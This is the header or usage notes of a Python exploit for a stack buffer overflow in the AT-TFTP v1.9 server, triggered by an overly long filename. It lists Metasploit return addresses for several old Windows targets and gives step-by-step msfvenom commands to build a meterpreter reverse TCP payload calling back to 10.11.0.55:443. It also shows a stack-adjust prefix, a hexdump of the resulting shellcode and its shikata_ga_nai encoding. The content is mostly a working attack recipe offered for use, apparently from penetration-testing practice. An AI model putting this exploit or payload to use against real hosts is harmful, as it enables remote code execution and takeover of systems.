attftp_long_filename exploit prepared by Muhammad Haidari https://github.com/Muhammd/attftp_long_filename
based on the https://www.exploit-db.com/exploits/16350/

Exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name. the Return addresses Extracted from Metasploit  

TODO: adjust 
        - pick the right return address for the appropriate target

Usage: python attftp_long_filename.py <IP Address> <Port> <Your IP Address>

Return addresses according to metasploit:

          [ 'Windows NT SP4 English',   { 'Ret' => 0x702ea6f7 } ],
          [ 'Windows 2000 SP0 English', { 'Ret' => 0x750362c3 } ],
          [ 'Windows 2000 SP1 English', { 'Ret' => 0x75031d85 } ],
          [ 'Windows 2000 SP2 English', { 'Ret' => 0x7503431b } ],
          [ 'Windows 2000 SP3 English', { 'Ret' => 0x74fe1c5a } ],
          [ 'Windows 2000 SP4 English', { 'Ret' => 0x75031dce } ],
          [ 'Windows XP SP0/1 English', { 'Ret' => 0x71ab7bfb } ],
          [ 'Windows XP SP2 English',   { 'Ret' => 0x71ab9372 } ],
          [ 'Windows XP SP3 English',   { 'Ret' => 0x7e429353 } ], # ret by c0re
          [ 'Windows Server 2003',      { 'Ret' => 0x7c86fed3 } ], # ret donated by securityxxxpert
          [ 'Windows Server 2003 SP2',  { 'Ret' => 0x7c86a01b } ], # ret donated by Polar Bear

 Max space for shell code = 210
 Bad characters according to metasploit: \x00
 Payload via: 

 Generate payload: msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=10.11.0.55 LPORT=443 -a x86 --platform Windows -f raw -o payload

 Prepend a stack adjust of -3500 to the payload before encoding:
 Obtain stack adjust of -3500 (0xdac as per printf '%x\n' 3500) with /usr/share/metasploit-framework/tools/nasm_shell.rb:	
       nasm > sub esp, 0xdac
	 00000000  81ECAC0D0000      sub esp,0xdac
 add opcodes to a file: perl -e 'print "\x81\xec\xac\x0d\x00\x00"' > stackadj

 Combine stackadj & payload: cat stackadj payload > shellcode
 hexdump -C shellcode
 00000000  81 ec ac 0d 00 00 fc 6a  eb 47 e8 f9 ff ff ff 60  |.......j.G.....`|
 00000010  31 db 8b 7d 3c 8b 7c 3d  78 01 ef 8b 57 20 01 ea  |1..}<.|=x...W ..|
 00000020  8b 34 9a 01 ee 31 c0 99  ac c1 ca 0d 01 c2 84 c0  |.4...1..........|
 00000030  75 f6 43 66 39 ca 75 e3  4b 8b 4f 24 01 e9 66 8b  |u.Cf9.u.K.O$..f.|
 00000040  1c 59 8b 4f 1c 01 e9 03  2c 99 89 6c 24 1c 61 ff  |.Y.O....,..l$.a.|
 00000050  e0 31 db 64 8b 43 30 8b  40 0c 8b 70 1c ad 8b 68  |.1.d.C0.@..p...h|
 00000060  08 5e 66 53 66 68 33 32  68 77 73 32 5f 54 66 b9  |.^fSfh32hws2_Tf.|
 00000070  72 60 ff d6 95 53 53 53  53 43 53 43 53 89 e7 66  |r`...SSSSCSCS..f|
 00000080  81 ef 08 02 57 53 66 b9  e7 df ff d6 66 b9 a8 6f  |....WSf.....f..o|
 00000090  ff d6 97 68 0a 0b 00 37  66 68 01 bb 66 53 89 e3  |...h...7fh..fS..|
 000000a0  6a 10 53 57 66 b9 57 05  ff d6 50 b4 0c 50 53 57  |j.SWf.W...P..PSW|
 000000b0  53 66 b9 c0 38 ff e6                              |Sf..8..|


 Encode shellcode: cat shellcode | msfvenom -p - -b \x00 -a x86 --platform Windows -e x86/shikata_ga_nai -f python
 x86/shikata_ga_nai succeeded with size 210 (iteration=0)
